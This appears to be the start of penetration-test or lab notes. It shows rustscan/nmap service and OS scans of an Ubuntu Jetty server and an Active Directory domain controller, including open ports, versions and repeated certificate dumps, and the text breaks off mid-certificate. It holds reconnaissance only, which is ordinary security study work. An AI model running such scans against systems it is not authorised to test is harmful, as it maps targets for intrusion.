```table-of-contents
```

# Enumeration
## NMAP - Ubuntu Web Server

```bash
ashu@kali ~ rustscan -a 10.0.29.163 -- -A       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/ashu/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.0.29.163:22
Open 10.0.29.163:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.0.29.163
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 22:10 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.00s elapsed
Initiating Ping Scan at 22:10
Scanning 10.0.29.163 [4 ports]
Completed Ping Scan at 22:10, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:10
Completed Parallel DNS resolution of 1 host. at 22:10, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:10
Scanning 10.0.29.163 [2 ports]
Discovered open port 8080/tcp on 10.0.29.163
Discovered open port 22/tcp on 10.0.29.163
Completed SYN Stealth Scan at 22:10, 0.24s elapsed (2 total ports)
Initiating Service scan at 22:10
Scanning 2 services on 10.0.29.163
Completed Service scan at 22:10, 7.00s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.0.29.163
Retrying OS detection (try #2) against 10.0.29.163
WARNING: OS didn't match until try #2
Initiating Traceroute at 22:10
Completed Traceroute at 22:10, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 22:10
Completed Parallel DNS resolution of 2 hosts. at 22:10, 0.01s elapsed
DNS resolution of 2 IPs took 0.01s. Mode: Async [#: 4, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.0.29.163.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 5.74s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.83s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.00s elapsed
Nmap scan report for 10.0.29.163
Host is up, received reset ttl 62 (0.20s latency).
Scanned at 2025-12-12 22:10:12 IST for 22s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a3:d8:42:85:3c:98:8b:4a:19:49:11:78:82:51:23:06 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFW6SgiFheQ0bqT68GqIopJxyXv7uf1gfYaVR/ojmlyzct1kvDeF/gcf99ogUf0tfstGYjCKAcjTndX9JkSvV6o=
|   256 94:c5:af:5a:56:32:ac:90:c0:b4:91:4b:53:68:a2:dc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO4QgvE/Pcb05vb2nX8P1vdwEDLKlhvK5/Z2Lnwbgwr1
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.20
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=12/12%OT=22%CT=%CU=30790%PV=Y%DS=3%DC=T%G=N%TM=693C458
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:02%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M57
OS:8NNT11NW7%O4=M578ST11NW7%O5=M578ST11NW7%O6=M578ST11)WIN(W1=F4B3%W2=F4B3%
OS:W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M578NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 3.457 days (since Tue Dec  9 11:13:06 2025)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   202.02 ms 10.200.0.1
2   ...
3   203.68 ms 10.0.29.163

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:10
Completed NSE at 22:10, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.38 seconds
           Raw packets sent: 68 (4.636KB) | Rcvd: 39 (2.988KB)

```

## NMAP - Domain Controller

```bash
rustscan -a 10.0.21.141 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/home/ashu/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.0.21.141:53
Open 10.0.21.141:80
Open 10.0.21.141:88
Open 10.0.21.141:135
Open 10.0.21.141:139
Open 10.0.21.141:389
Open 10.0.21.141:445
Open 10.0.21.141:464
Open 10.0.21.141:593
Open 10.0.21.141:636
Open 10.0.21.141:3269
Open 10.0.21.141:3268
Open 10.0.21.141:3389
Open 10.0.21.141:9389
Open 10.0.21.141:49664
Open 10.0.21.141:49666
Open 10.0.21.141:49671
Open 10.0.21.141:49674
Open 10.0.21.141:49675
Open 10.0.21.141:49694
Open 10.0.21.141:49708
Open 10.0.21.141:49743
Open 10.0.21.141:58421
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.0.21.141
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 22:24 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:24
Completed NSE at 22:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:24
Completed NSE at 22:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:24
Completed NSE at 22:24, 0.00s elapsed
Initiating Ping Scan at 22:24
Scanning 10.0.21.141 [4 ports]
Completed Ping Scan at 22:24, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:24
Completed Parallel DNS resolution of 1 host. at 22:24, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:24
Scanning 10.0.21.141 [23 ports]
Discovered open port 3389/tcp on 10.0.21.141
Discovered open port 53/tcp on 10.0.21.141
Discovered open port 445/tcp on 10.0.21.141
Discovered open port 49694/tcp on 10.0.21.141
Discovered open port 135/tcp on 10.0.21.141
Discovered open port 9389/tcp on 10.0.21.141
Discovered open port 464/tcp on 10.0.21.141
Discovered open port 80/tcp on 10.0.21.141
Discovered open port 139/tcp on 10.0.21.141
Discovered open port 49743/tcp on 10.0.21.141
Discovered open port 593/tcp on 10.0.21.141
Discovered open port 49674/tcp on 10.0.21.141
Discovered open port 49664/tcp on 10.0.21.141
Discovered open port 636/tcp on 10.0.21.141
Discovered open port 58421/tcp on 10.0.21.141
Discovered open port 49675/tcp on 10.0.21.141
Discovered open port 49708/tcp on 10.0.21.141
Discovered open port 49666/tcp on 10.0.21.141
Discovered open port 3269/tcp on 10.0.21.141
Discovered open port 88/tcp on 10.0.21.141
Discovered open port 49671/tcp on 10.0.21.141
Discovered open port 3268/tcp on 10.0.21.141
Discovered open port 389/tcp on 10.0.21.141
Completed SYN Stealth Scan at 22:24, 0.44s elapsed (23 total ports)
Initiating Service scan at 22:24
Scanning 23 services on 10.0.21.141
Completed Service scan at 22:25, 63.53s elapsed (23 services on 1 host)
Initiating OS detection (try #1) against 10.0.21.141
Retrying OS detection (try #2) against 10.0.21.141
Initiating Traceroute at 22:25
Completed Traceroute at 22:25, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 22:25
Completed Parallel DNS resolution of 2 hosts. at 22:25, 0.01s elapsed
DNS resolution of 2 IPs took 0.01s. Mode: Async [#: 4, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.0.21.141.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:25
NSE Timing: About 99.97% done; ETC: 22:26 (0:00:00 remaining)
Completed NSE at 22:26, 43.28s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, -3.86s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Nmap scan report for 10.0.21.141
Host is up, received echo-reply ttl 126 (0.21s latency).
Scanned at 2025-12-12 22:24:19 IST for 112s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-12-12 16:54:26Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Anomaly-DC.anomaly.hsm
| Issuer: commonName=anomaly-ANOMALY-DC-CA-2/domainComponent=anomaly
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T22:14:26
| Not valid after:  2026-09-21T22:14:26
| MD5:   2fe3:c33e:4416:0677:f09c:3141:7ebc:dadb
| SHA-1: b3a6:bd0d:65f4:b2df:70eb:efa4:8743:fe35:41ad:9aaf
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITIQAAAAM9m5XZT2Xc6AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHNtMRcwFQYKCZImiZPyLGQBGRYHYW5vbWFs
| eTEgMB4GA1UEAxMXYW5vbWFseS1BTk9NQUxZLURDLUNBLTIwHhcNMjUwOTIxMjIx
| NDI2WhcNMjYwOTIxMjIxNDI2WjAhMR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21h
| bHkuaHNtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCagvgml4j2e
| 5nrfPKR8JZwz5cbfPbSf4QOxbZ6pEnQQVTNTEvwOd9Pc9arSMq5moBShpDALHhyv
| Pdg1nBdz6d9h7RZgqSqVDe9zbxUH067s7ePi+1Lm6VlMsprbdKRMnos2PJImKWTf
